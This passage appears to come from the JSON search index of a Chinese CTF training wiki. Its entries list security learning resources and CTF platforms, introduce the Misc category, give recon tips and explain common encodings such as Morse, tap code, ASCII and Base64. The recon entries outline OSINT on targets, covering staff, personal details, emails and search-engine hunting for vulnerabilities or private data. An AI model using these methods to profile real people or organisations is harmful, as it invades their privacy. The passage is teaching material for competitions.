            "text": "\u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b  \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b  \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b  \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u7814\u7a76\u503c\u5f97\u671f\u5f85\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002", 
            "title": "CGC \u7ecf\u9a8c\u603b\u7ed3"
        }, 
        {
            "location": "/introduction/resources/", 
            "text": "\u5728\u7ebf\u5b66\u4e60\n\n\n\n\ni \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0\n\n\n\u5b9e\u9a8c\u5427\uff0d\u8ba9\u5b9e\u9a8c\u66f4\u7b80\u5355\uff01\n\n\n\u770b\u96ea\u77e5\u8bc6\u5e93\n\n\n\n\n\u5b66\u4e60\u8def\u7ebf\n\n\n\n\n\u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1\n\n\n\u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811 \n\n\n\u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26\n\n\n\u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n\n\n\n\n\n\u4fe1\u606f\u8d44\u8baf\n\n\n\n\nFreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2\n\n\n\u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53\n\n\n\u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168\n\n\nSec-News \u5b89\u5168\u6587\u6458\n\n\n\n\n\u6280\u672f\u8bba\u575b\n\n\n\n\n\u543e\u7231\u7834\u89e3\n\n\n\u770b\u96ea\u8bba\u575b\n\n\n\u5148\u77e5\u793e\u533a\n\n\ni\u6625\u79cb\u8bba\u575b\n\n\n\n\nCTF \u8d5b\u4e8b\n\n\n\n\nXCTF\u793e\u533a\n\n\nCTFtime\n\n\nCTF Rank\n\n\n\n\nCTF OJ\n\n\n\n\nXCTF OJ\n\n\nCTF\u5927\u672c\u8425\n\n\npwnhub\n\n\n\u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0\n\n\nHackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0\n\n\nBugkuCTF\n\n\nWeChall\n\n\nSniper OJ\n\n\nJarvis OJ\n\n\nCTF Learn\n\n\n\n\nCTF \u5de5\u5177\n\n\n\n\n\u770b\u96ea\u5de5\u5177\n\n\nCTF\u5728\u7ebf\u5de5\u5177 by CTFcode\n\n\nCTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku\n\n\nCTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team\n\n\nctf-tools by zardus\n\n\n\n\nCTF Writeup \u96c6\u5408\n\n\n\n\nCTFs Writeup \u96c6\u9526\n\n\nCTF solution by p4 team", 
            "title": "\u5b66\u4e60\u8d44\u6e90"
        }, 
        {
            "location": "/introduction/resources/#_1", 
            "text": "i \u6625\u79cb-\u4e13\u4e1a\u7684\u7f51\u7edc\u5b89\u5168|\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u5b66\u4e60\u57f9\u8bad\u5e73\u53f0  \u5b9e\u9a8c\u5427\uff0d\u8ba9\u5b9e\u9a8c\u66f4\u7b80\u5355\uff01  \u770b\u96ea\u77e5\u8bc6\u5e93", 
            "title": "\u5728\u7ebf\u5b66\u4e60"
        }, 
        {
            "location": "/introduction/resources/#_2", 
            "text": "\u77e5\u9053\u521b\u5b87\u7814\u53d1\u6280\u80fd\u8868 v3.1  \u6f0f\u6d1e\u94f6\u884c(BUGBANK)\u6280\u80fd\u6811   \u5b89\u5168\u6280\u80fd\u6811\u7b80\u7248 by \u4f59\u5f26  \u5b89\u5168\u7c7b\u601d\u7ef4\u5bfc\u56fe by phith0n", 
            "title": "\u5b66\u4e60\u8def\u7ebf"
        }, 
        {
            "location": "/introduction/resources/#_3", 
            "text": "FreeBuf.COM | \u5173\u6ce8\u9ed1\u5ba2\u4e0e\u6781\u5ba2  \u5b89\u5168\u5ba2 - \u6709\u601d\u60f3\u7684\u5b89\u5168\u65b0\u5a92\u4f53  \u5636\u543c RoarTalk \u2013 \u56de\u5f52\u6700\u672c\u8d28\u7684\u4fe1\u606f\u5b89\u5168  Sec-News \u5b89\u5168\u6587\u6458", 
            "title": "\u4fe1\u606f\u8d44\u8baf"
        }, 
        {
            "location": "/introduction/resources/#_4", 
            "text": "\u543e\u7231\u7834\u89e3  \u770b\u96ea\u8bba\u575b  \u5148\u77e5\u793e\u533a  i\u6625\u79cb\u8bba\u575b", 
            "title": "\u6280\u672f\u8bba\u575b"
        }, 
        {
            "location": "/introduction/resources/#ctf", 
            "text": "XCTF\u793e\u533a  CTFtime  CTF Rank", 
            "title": "CTF \u8d5b\u4e8b"
        }, 
        {
            "location": "/introduction/resources/#ctf-oj", 
            "text": "XCTF OJ  CTF\u5927\u672c\u8425  pwnhub  \u5357\u90ae\u7f51\u7edc\u653b\u9632\u8bad\u7ec3\u5e73\u53f0  HackingLab \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0  BugkuCTF  WeChall  Sniper OJ  Jarvis OJ  CTF Learn", 
            "title": "CTF OJ"
        }, 
        {
            "location": "/introduction/resources/#ctf_1", 
            "text": "\u770b\u96ea\u5de5\u5177  CTF\u5728\u7ebf\u5de5\u5177 by CTFcode  CTF\u5728\u7ebf\u5de5\u5177\u7bb1 by bugku  CTF\u5de5\u5177\u8d44\u6e90\u5e93 by HBCTF team  ctf-tools by zardus", 
            "title": "CTF \u5de5\u5177"
        }, 
        {
            "location": "/introduction/resources/#ctf-writeup", 
            "text": "CTFs Writeup \u96c6\u9526  CTF solution by p4 team", 
            "title": "CTF Writeup \u96c6\u5408"
        }, 
        {
            "location": "/misc/introduction/", 
            "text": "Misc \u662f\u82f1\u6587 Miscellaneous \u7684\u524d\u56db\u4e2a\u5b57\u6bcd\uff0c\u6742\u9879\u3001\u6df7\u5408\u4f53\u3001\u5927\u6742\u70e9\u7684\u610f\u601d\u3002\n\n\nMisc \u5728\u56fd\u5916\u7684\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u53c8\u88ab\u5177\u4f53\u5212\u5206\u4e3a\u5404\u4e2a\u5c0f\u5757\uff0c\u6709\n\n\n\n\nRecon\n\n\nForensic\n\n\nStego\n\n\nMisc\n\n\n\u2026\u2026\n\n\n\n\n\u5728\u56fd\u5185\u5185\u7684\u6bd4\u8d5b\u4e2d\uff0c\u88ab\u7edf\u4e00\u5212\u5206\u5165 Misc \u9886\u57df\uff0c\u6709\u65f6 Crypto\uff08\u5c24\u5176\u662f\u53e4\u5178\u5bc6\u7801\uff09\u4e5f\u88ab\u5212\u5165\u5176\u4e2d\u3002\n\n\n\u5728 Misc \u8fd9\u4e00\u7ae0\u8282\u4e2d\uff0c\u5c06\u4ece\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u4ecb\u7ecd\u8fd9\u4e00\u5757\u7684\u77e5\u8bc6\uff1a\n\n\n\n\n\n\nRecon\uff08\u4fe1\u606f\u641c\u96c6\uff09\n\n\n\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e9b\u83b7\u53d6\u4fe1\u606f\u7684\u6e20\u9053\u548c\u4e00\u4e9b\u5229\u7528\u767e\u5ea6\u3001\u8c37\u6b4c\u7b49\u641c\u7d22\u5f15\u64ce\u7684\u6280\u5de7\n\n\n\n\n\n\nEncode\uff08\u7f16\u7801\u8f6c\u6362\uff09\n\n\n\u4e3b\u8981\u4ecb\u7ecd\u5728 CTF \u6bd4\u8d5b\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u7f16\u7801\u5f62\u5f0f\u4ee5\u53ca\u8f6c\u6362\u7684\u6280\u5de7\u548c\u5e38\u89c1\u65b9\u5f0f\n\n\n\n\n\n\nForensic \n Stego\uff08\u6570\u5b57\u53d6\u8bc1 \n \u9690\u5199\u5206\u6790\uff09\n\n\n\u9690\u5199\u53d6\u8bc1\u662f Misc \u4e2d\u6700\u4e3a\u91cd\u8981\u7684\u4e00\u5757\uff0c\u5305\u62ec\u6587\u4ef6\u5206\u6790\u3001\u9690\u5199\u3001\u5185\u5b58\u955c\u50cf\u5206\u6790\u548c\u6d41\u91cf\u6293\u5305\u5206\u6790\u7b49\u7b49\uff0c\u6d89\u53ca\u5de7\u5999\u7684\u7f16\u7801\u3001\u9690\u85cf\u6570\u636e\u3001\u5c42\u5c42\u5d4c\u5957\u7684\u6587\u4ef6\u4e2d\u7684\u6587\u4ef6\uff0c\u7075\u6d3b\u5229\u7528\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u6240\u9700\u8981\u7684\u4fe1\u606f\u7b49\u7b49\u3002\n\n\n\n\n\n\nCTF \u4e2d Misc \u4e0e\u73b0\u5b9e\u4e2d\u7684\u53d6\u8bc1\u4e0d\u540c\uff0c\u73b0\u5b9e\u4e2d\u7684\u53d6\u8bc1\u5f88\u5c11\u4f1a\u6d89\u53ca\u5de7\u5999\u7684\u7f16\u7801\u52a0\u5bc6\uff0c\u6570\u636e\u9690\u85cf\uff0c\u88ab\u5206\u6563\u5d4c\u5957\u5728\u5404\u5904\u7684\u6587\u4ef6\u5b57\u7b26\u4e32\uff0c\u6216\u662f\u5176\u4ed6\u8111\u6d1e\u7c7b\u7684\nChanllenge\u3002\u5f88\u591a\u65f6\u5019\u662f\u53bb\u7cbe\u5fc3\u6062\u590d\u4e00\u4e2a\u6b8b\u635f\u7684\u6587\u4ef6\uff0c\u6316\u6398\u635f\u574f\u786c\u76d8\u4e2d\u7684\u86db\u4e1d\u9a6c\u8ff9,\u6216\u8005\u4ece\u5185\u5b58\u955c\u50cf\u4e2d\u62bd\u53d6\u6709\u7528\u7684\u4fe1\u606f\u3002\n\n\n\u73b0\u5b9e\u7684\u53d6\u8bc1\u9700\u8981\u4ece\u4e1a\u8005\u80fd\u591f\u627e\u51fa\u95f4\u63a5\u7684\u6076\u610f\u884c\u4e3a\u8bc1\u636e\uff1a\u653b\u51fb\u8005\u653b\u51fb\u7cfb\u7edf\u7684\u75d5\u8ff9\uff0c\u6216\u662f\u5185\u90e8\u5a01\u80c1\u884c\u4e3a\u7684\u75d5\u8ff9\u3002\u5b9e\u9645\u5de5\u4f5c\u4e2d\u8ba1\u7b97\u673a\u53d6\u8bc1\u5927\u90e8\u5206\u662f\u4ece\u65e5\u5fd7\u3001\u5185\u5b58\u3001\u6587\u4ef6\u7cfb\u7edf\u4e2d\u627e\u51fa\u72af\u7f6a\u7ebf\u7d22\uff0c\u5e76\u627e\u51fa\u4e0e\u6587\u4ef6\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6570\u636e\u7684\u5173\u7cfb\u3002\u800c\u6d41\u91cf\u53d6\u8bc1\u6bd4\u8d77\u5185\u5bb9\u6570\u636e\u7684\u5206\u6790\uff0c\u66f4\u6ce8\u91cd\u5143\u6570\u636e\u7684\u5206\u6790\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u4e0d\u540c\u7aef\u70b9\u95f4\u5e38\u7528TLS\u52a0\u5bc6\u7684\u7f51\u7edc\u4f1a\u8bdd\u3002\n\n\nMisc \u662f\u5207\u5165 CTF \u7ade\u8d5b\u9886\u57df\u3001\u57f9\u517b\u5174\u8da3\u7684\u6700\u4f73\u5165\u53e3\u3002Misc \u8003\u5bdf\u57fa\u672c\u77e5\u8bc6\uff0c\u5bf9\u5b89\u5168\u6280\u80fd\u7684\u5404\u4e2a\u5c42\u9762\u90fd\u6709\u4e0d\u540c\u7a0b\u5ea6\u7684\u6d89\u53ca\uff0c\u53ef\u4ee5\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u542f\u53d1\u601d\u7ef4\u3002", 
            "title": "\u6742\u9879\u7b80\u4ecb"
        }, 
        {
            "location": "/misc/recon/", 
            "text": "\u7f51\u7edc\u4fe1\u606f\u641c\u96c6\u6280\u5de7\n\n\n\n\n\u516c\u5f00\u6e20\u9053\n\n\n\u76ee\u6807 Web \u7f51\u9875\u3001\u5730\u7406\u4f4d\u7f6e\u3001\u76f8\u5173\u7ec4\u7ec7\n\n\n\u7ec4\u7ec7\u7ed3\u6784\u548c\u4eba\u5458\u3001\u4e2a\u4eba\u8d44\u6599\u3001\u7535\u8bdd\u3001\u7535\u5b50\u90ae\u4ef6\n\n\n\u7f51\u7edc\u914d\u7f6e\u3001\u5b89\u5168\u9632\u62a4\u673a\u5236\u7684\u7b56\u7565\u548c\u6280\u672f\u7ec6\u8282\n\n\n\u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u67e5\u627e\u7279\u5b9a\u5b89\u5168\u6f0f\u6d1e\u6216\u79c1\u5bc6\u4fe1\u606f\u7684\u65b9\u6cd5\n\n\nGoogle Hacking Database\n\n\n\u79d1\u5b66\u4e0a\u7f51\n\n\n\n\n\u57fa\u672c\u641c\u7d22\u6280\u5de7\n\n\n\n\nGoogle \u57fa\u672c\u641c\u7d22\u4e0e\u6316\u6398\u6280\u5de7\n\n\n\u4fdd\u6301\u7b80\u5355\u660e\u4e86\u7684\u5173\u952e\u8bcd\n\n\n\u4f7f\u7528\u6700\u53ef\u80fd\u51fa\u73b0\u5728\u8981\u67e5\u627e\u7684\u7f51\u9875\u4e0a\u7684\u5b57\u8bcd\n\n\n\u5c3d\u91cf\u7b80\u660e\u627c\u8981\u5730\u63cf\u8ff0\u8981\u67e5\u627e\u7684\u5185\u5bb9\n\n\n\u9009\u62e9\u72ec\u7279\u6027\u7684\u63cf\u8ff0\u5b57\u8bcd\n\n\n\u793e\u4f1a\u516c\u5171\u4fe1\u606f\u5e93\u67e5\u8be2\n\n\n\u4e2a\u4eba\u4fe1\u606f\uff1a\u4eba\u53e3\u7edf\u8ba1\u5c40\n\n\n\u4f01\u4e1a\u7b49\u5b9e\u4f53\uff1aYellowPage\u3001\u4f01\u4e1a\u4fe1\u7528\u4fe1\u606f\u7f51\n\n\n\u7f51\u7ad9\u3001\u57df\u540d\u3001IP\uff1awhois \u7b49\n\n\n\n\n\u5730\u56fe\u548c\u8857\u666f\u641c\u7d22\n\n\n\n\n\u56fd\u5916\uff1aGoogle Map\u3001Google Earth\u3001Google Street View\n\n\n\u56fd\u5185\uff1a\u767e\u5ea6\u5730\u56fe\u3001\u536b\u661f\u5730\u56fe\u3001\u8857\u666f\n\n\n\u4ece\u7f51\u7edc\u4e16\u754c\u5230\u7269\u7406\u4e16\u754c\uff1aIP2Location\n\n\nwhois \u6570\u636e\u5e93\n\n\nGeoIP\n\n\nIP2Location\n\n\n\u7eaf\u771f\u6570\u636e\u5e93\uff08QQ IP \u67e5\u8be2\uff09", 
            "title": "\u4fe1\u606f\u641c\u96c6\u6280\u672f"
        }, 
        {
            "location": "/misc/recon/#_1", 
            "text": "\u516c\u5f00\u6e20\u9053  \u76ee\u6807 Web \u7f51\u9875\u3001\u5730\u7406\u4f4d\u7f6e\u3001\u76f8\u5173\u7ec4\u7ec7  \u7ec4\u7ec7\u7ed3\u6784\u548c\u4eba\u5458\u3001\u4e2a\u4eba\u8d44\u6599\u3001\u7535\u8bdd\u3001\u7535\u5b50\u90ae\u4ef6  \u7f51\u7edc\u914d\u7f6e\u3001\u5b89\u5168\u9632\u62a4\u673a\u5236\u7684\u7b56\u7565\u548c\u6280\u672f\u7ec6\u8282  \u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u67e5\u627e\u7279\u5b9a\u5b89\u5168\u6f0f\u6d1e\u6216\u79c1\u5bc6\u4fe1\u606f\u7684\u65b9\u6cd5  Google Hacking Database  \u79d1\u5b66\u4e0a\u7f51", 
            "title": "\u7f51\u7edc\u4fe1\u606f\u641c\u96c6\u6280\u5de7"
        }, 
        {
            "location": "/misc/recon/#_2", 
            "text": "Google \u57fa\u672c\u641c\u7d22\u4e0e\u6316\u6398\u6280\u5de7  \u4fdd\u6301\u7b80\u5355\u660e\u4e86\u7684\u5173\u952e\u8bcd  \u4f7f\u7528\u6700\u53ef\u80fd\u51fa\u73b0\u5728\u8981\u67e5\u627e\u7684\u7f51\u9875\u4e0a\u7684\u5b57\u8bcd  \u5c3d\u91cf\u7b80\u660e\u627c\u8981\u5730\u63cf\u8ff0\u8981\u67e5\u627e\u7684\u5185\u5bb9  \u9009\u62e9\u72ec\u7279\u6027\u7684\u63cf\u8ff0\u5b57\u8bcd  \u793e\u4f1a\u516c\u5171\u4fe1\u606f\u5e93\u67e5\u8be2  \u4e2a\u4eba\u4fe1\u606f\uff1a\u4eba\u53e3\u7edf\u8ba1\u5c40  \u4f01\u4e1a\u7b49\u5b9e\u4f53\uff1aYellowPage\u3001\u4f01\u4e1a\u4fe1\u7528\u4fe1\u606f\u7f51  \u7f51\u7ad9\u3001\u57df\u540d\u3001IP\uff1awhois \u7b49", 
            "title": "\u57fa\u672c\u641c\u7d22\u6280\u5de7"
        }, 
        {
            "location": "/misc/recon/#_3", 
            "text": "\u56fd\u5916\uff1aGoogle Map\u3001Google Earth\u3001Google Street View  \u56fd\u5185\uff1a\u767e\u5ea6\u5730\u56fe\u3001\u536b\u661f\u5730\u56fe\u3001\u8857\u666f  \u4ece\u7f51\u7edc\u4e16\u754c\u5230\u7269\u7406\u4e16\u754c\uff1aIP2Location  whois \u6570\u636e\u5e93  GeoIP  IP2Location  \u7eaf\u771f\u6570\u636e\u5e93\uff08QQ IP \u67e5\u8be2\uff09", 
            "title": "\u5730\u56fe\u548c\u8857\u666f\u641c\u7d22"
        }, 
        {
            "location": "/misc/encode/communication/", 
            "text": "\u7535\u8bdd\u62e8\u53f7\u7f16\u7801\n\n\n1-9 \u5206\u522b\u4f7f\u7528 1-9 \u4e2a\u8109\u51b2\uff0c0 \u5219\u8868\u793a\u4f7f\u7528 10 \u4e2a\u8109\u51b2\u3002\n\n\nMorse \u7f16\u7801\n\n\n\u53c2\u89c1 \n\u6469\u5c14\u65af\u7f16\u7801 -\u7ef4\u57fa\u767e\u79d1\n\uff0c\u5bf9\u5e94\u8868\u5982\u4e0b\n\n\n\n\n\u7279\u70b9\n\n\n\n\n\u53ea\u6709 \n.\n \u548c \n-\n\uff1b\n\n\n\u6700\u591a 6 \u4f4d\uff1b\n\n\n\u4e5f\u53ef\u4ee5\u4f7f\u7528 \n01\n \u4e32\u8868\u793a\u3002\n\n\n\n\n\u5de5\u5177\n\n\n\n\n\u6469\u5c14\u65af\u7f16\u7801\u5728\u7ebf\u8f6c\u6362\n\n\n\n\n\u9898\u76ee\n\n\n\n\nJarvisOJ - Basec - \u300c-.-\u5b57\u7b26\u4e32\u300d\n\n\n\n\n\u6572\u51fb\u7801\n\n\n\u6572\u51fb\u7801\uff08Tap code\uff09\u662f\u4e00\u79cd\u4ee5\u975e\u5e38\u7b80\u5355\u7684\u65b9\u5f0f\u5bf9\u6587\u672c\u4fe1\u606f\u8fdb\u884c\u7f16\u7801\u7684\u65b9\u6cd5\u3002\u56e0\u8be5\u7f16\u7801\u5bf9\u4fe1\u606f\u901a\u8fc7\u4f7f\u7528\u4e00\u7cfb\u5217\u7684\u70b9\u51fb\u58f0\u97f3\u6765\u7f16\u7801\u800c\u547d\u540d\uff0c\u6572\u51fb\u7801\u662f\u57fa\u4e8e 5 \u00d75 \u65b9\u683c\u6ce2\u5229\u6bd4\u5965\u65af\u65b9\u9635\u6765\u5b9e\u73b0\u7684\uff0c\u4e0d\u540c\u70b9\u662f\u662f\u7528 K \u5b57\u6bcd\u88ab\u6574\u5408\u5230 C \u4e2d\u3002\n\n\n1  2  3  4  5\n\n\n\n\n\n\n1 A B C/K D E 2 F G H I J 3 L M N O P 4 Q R S T U 5 V W X Y Z\n\n\n\n\n\n\n\u66fc\u5f7b\u65af\u7279\u7f16\u7801\n\n\n\n\n\u66fc\u5f7b\u65af\u7279\u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1\n\n\n\n\n\u683c\u96f7\u7f16\u7801\n\n\n\n\n\u683c\u96f7\u7801 - \u7ef4\u57fa\u767e\u79d1", 
            "title": "\u901a\u4fe1\u9886\u57df\u5e38\u7528\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/communication/#_1", 
            "text": "1-9 \u5206\u522b\u4f7f\u7528 1-9 \u4e2a\u8109\u51b2\uff0c0 \u5219\u8868\u793a\u4f7f\u7528 10 \u4e2a\u8109\u51b2\u3002", 
            "title": "\u7535\u8bdd\u62e8\u53f7\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/communication/#morse", 
            "text": "\u53c2\u89c1  \u6469\u5c14\u65af\u7f16\u7801 -\u7ef4\u57fa\u767e\u79d1 \uff0c\u5bf9\u5e94\u8868\u5982\u4e0b", 
            "title": "Morse \u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/communication/#_2", 
            "text": "\u53ea\u6709  .  \u548c  - \uff1b  \u6700\u591a 6 \u4f4d\uff1b  \u4e5f\u53ef\u4ee5\u4f7f\u7528  01  \u4e32\u8868\u793a\u3002", 
            "title": "\u7279\u70b9"
        }, 
        {
            "location": "/misc/encode/communication/#_3", 
            "text": "\u6469\u5c14\u65af\u7f16\u7801\u5728\u7ebf\u8f6c\u6362", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/misc/encode/communication/#_4", 
            "text": "JarvisOJ - Basec - \u300c-.-\u5b57\u7b26\u4e32\u300d", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/misc/encode/communication/#_5", 
            "text": "\u6572\u51fb\u7801\uff08Tap code\uff09\u662f\u4e00\u79cd\u4ee5\u975e\u5e38\u7b80\u5355\u7684\u65b9\u5f0f\u5bf9\u6587\u672c\u4fe1\u606f\u8fdb\u884c\u7f16\u7801\u7684\u65b9\u6cd5\u3002\u56e0\u8be5\u7f16\u7801\u5bf9\u4fe1\u606f\u901a\u8fc7\u4f7f\u7528\u4e00\u7cfb\u5217\u7684\u70b9\u51fb\u58f0\u97f3\u6765\u7f16\u7801\u800c\u547d\u540d\uff0c\u6572\u51fb\u7801\u662f\u57fa\u4e8e 5 \u00d75 \u65b9\u683c\u6ce2\u5229\u6bd4\u5965\u65af\u65b9\u9635\u6765\u5b9e\u73b0\u7684\uff0c\u4e0d\u540c\u70b9\u662f\u662f\u7528 K \u5b57\u6bcd\u88ab\u6574\u5408\u5230 C \u4e2d\u3002  1  2  3  4  5   1 A B C/K D E 2 F G H I J 3 L M N O P 4 Q R S T U 5 V W X Y Z", 
            "title": "\u6572\u51fb\u7801"
        }, 
        {
            "location": "/misc/encode/communication/#_6", 
            "text": "\u66fc\u5f7b\u65af\u7279\u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1", 
            "title": "\u66fc\u5f7b\u65af\u7279\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/communication/#_7", 
            "text": "\u683c\u96f7\u7801 - \u7ef4\u57fa\u767e\u79d1", 
            "title": "\u683c\u96f7\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/", 
            "text": "\u672c\u8282\u4ecb\u7ecd\u4e00\u4e9b\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u7f16\u7801\u3002\n\n\n\u5b57\u6bcd\u8868\u7f16\u7801\n\n\n\n\nA-Z/a-z \u5bf9\u5e94 1-26 \u6216\u8005 0-25\n\n\n\n\nASCII \u7f16\u7801\n\n\n\n\n\u7279\u70b9\n\n\n\u6211\u4eec\u4e00\u822c\u4f7f\u7528\u7684 ascii \u7f16\u7801\u7684\u65f6\u5019\u91c7\u7528\u7684\u90fd\u662f\u53ef\u89c1\u5b57\u7b26\uff0c\u800c\u4e14\u4e3b\u8981\u662f\u5982\u4e0b\u5b57\u7b26\n\n\n\n\n0-9, 49-57\n\n\nA-Z, 65-90\n\n\na-z, 97-122\n\n\n\n\n\u53d8\u5f62\n\n\n\u4e8c\u8fdb\u5236\u7f16\u7801\n\n\n\u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u4e8c\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002\n\n\n\n\n\u53ea\u6709 0 \u548c 1\n\n\n\u4e0d\u5927\u4e8e 8 \u4f4d\uff0c\u4e00\u822c 7 \u4f4d\u4e5f\u53ef\u4ee5\uff0c\u56e0\u4e3a\u53ef\u89c1\u5b57\u7b26\u5230 127\u3002\n\n\n\u5176\u5b9e\u662f\u53e6\u4e00\u79cd ascii \u7f16\u7801\u3002\n\n\n\n\n\u5341\u516d\u8fdb\u5236\u7f16\u7801\n\n\n\u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u5341\u516d\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002\n\n\n\n\nA-Z\n41-5 A\n\n\na-z\n61-7 A\n\n\n\n\n\u5de5\u5177\n\n\n\n\njpk, ascii to number, number to ascii\n\n\nhttp://www.ab126.com/goju/1711.html\n\n\n\n\n\u4f8b\u5b50\n\n\n\n\n\u9898\u76ee\n\n\n\n\nJarvis-basic-\u5fb7\u519b\u7684\u5bc6\u7801\n\n\n\n\nBase \u7f16\u7801\n\n\nbase xx \u4e2d\u7684 xx \u8868\u793a\u7684\u662f\u91c7\u7528\u591a\u5c11\u4e2a\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c\u6bd4\u5982\u8bf4 base64 \u5c31\u662f\u91c7\u7528\u4ee5\u4e0b 64 \u4e2a\u5b57\u7b26\u7f16\u7801\uff0c\u7531\u4e8e 2 \u7684 6 \u6b21\u65b9\u7b49\u4e8e 64\uff0c\u6240\u4ee5\u6bcf 6 \u4e2a\u6bd4\u7279\u4e3a\u4e00\u4e2a\u5355\u5143\uff0c\u5bf9\u5e94\u67d0\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u30023\u4e2a\u5b57\u8282\u5c31\u6709 24 \u4e2a\u6bd4\u7279\uff0c\u5bf9\u5e94\u4e8e 4 \u4e2a Base64 \u5355\u5143\uff0c\u5373 3 \u4e2a\u5b57\u8282\u9700\u8981\u7528 4 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u6765\u8868\u793a\u3002\u5b83\u53ef\u7528\u6765\u4f5c\u4e3a\u7535\u5b50\u90ae\u4ef6\u7684\u4f20\u8f93\u7f16\u7801\u3002\u5728 Base64 \u4e2d\u7684\u53ef\u6253\u5370\u5b57\u7b26\u5305\u62ec\u5b57\u6bcd A-Z\u3001a-z\u3001\u6570\u5b57 0-9\uff0c\u8fd9\u6837\u5171\u6709 62 \u4e2a\u5b57\u7b26\uff0c\u6b64\u5916\u4e24\u4e2a\u53ef\u6253\u5370\u7b26\u53f7\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u4e2d\u800c\u4e0d\u540c\u3002\n\n\n\n\n\u5177\u4f53\u4ecb\u7ecd\u53c2\u89c1 \nBase64 - \u7ef4\u57fa\u767e\u79d1\n\u3002\n\n\n\u7f16\u7801 man\n\n\n\n\n\u5982\u679c\u8981\u7f16\u7801\u7684\u5b57\u8282\u6570\u4e0d\u80fd\u88ab 3 \u6574\u9664\uff0c\u6700\u540e\u4f1a\u591a\u51fa 1 \u4e2a\u6216 2 \u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\uff1a\u5148\u4f7f\u7528 0 \u503c\u5728\u672b\u5c3e\u8865\u8db3\uff0c\u4f7f\u5176\u80fd\u591f\u88ab 3 \u6574\u9664\uff0c\u7136\u540e\u518d\u8fdb\u884c base64 \u7684\u7f16\u7801\u3002\u5728\u7f16\u7801\u540e\u7684 base64 \u6587\u672c\u540e\u52a0\u4e0a\u4e00\u4e2a\u6216\u4e24\u4e2a \n=\n \u53f7\uff0c\u4ee3\u8868\u8865\u8db3\u7684\u5b57\u8282\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6700\u540e\u5269\u4f59\u4e00\u4e2a\u516b\u4f4d\u5b57\u8282\uff08\u4e00\u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base64 \u5b57\u8282\u5757\u6709\u56db\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e0a\u4e24\u4e2a\u7b49\u53f7\uff1b\u5982\u679c\u6700\u540e\u5269\u4f59\u4e24\u4e2a\u516b\u4f4d\u5b57\u8282\uff082 \u4e2a 